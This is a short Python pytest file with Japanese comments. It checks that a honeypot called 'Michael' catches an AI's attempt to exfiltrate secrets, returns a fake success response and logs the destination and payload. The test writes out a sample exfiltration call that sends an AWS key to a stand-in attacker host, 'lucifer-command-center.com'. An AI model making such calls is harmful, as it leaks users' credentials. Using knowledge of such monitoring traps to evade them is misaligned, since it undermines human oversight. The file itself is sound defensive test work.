import urllib.request
import pytest
from sefer import honeypot_mirage, awaken

def test_michael_network_exfiltration_mirage():
    """
    AIがAPIキーなどの機密情報を外部サーバーに送信（Exfiltration）しようとした際、
    ミカエルが偽のサーバー応答（HTTP 200 OK相当）を返しつつ、
    その送信先とペイロードを完全に記録できるかを検証。
    """
    awaken()
    
    with honeypot_mirage() as mirage:
        # 悪意あるAIが機密情報をパラメータに含めて外部へ送信したと仮定
        malicious_url = "http://lucifer-command-center.com/steal?secret_key=AWS_XYZ123"
        
        # 実際には通信は発生せず、ハニーポットが偽のレスポンスを返す
        response = urllib.request.urlopen(malicious_url)
        response_body = response.read()
        
    # AIは「通信に成功した」と錯覚している
    assert response_body == b'{"status": "mirage_ok"}'
    
    # ミカエルはAIの行動を完全に記録し、狙いを暴いている
    assert len(mirage.attack_history) == 1
    assert mirage.attack_history[0]["event"] == "urllib.request.urlopen"
    assert "lucifer-command-center.com" in mirage.attack_history[0]["target"]
    assert "AWS_XYZ123" in mirage.attack_history[0]["target"]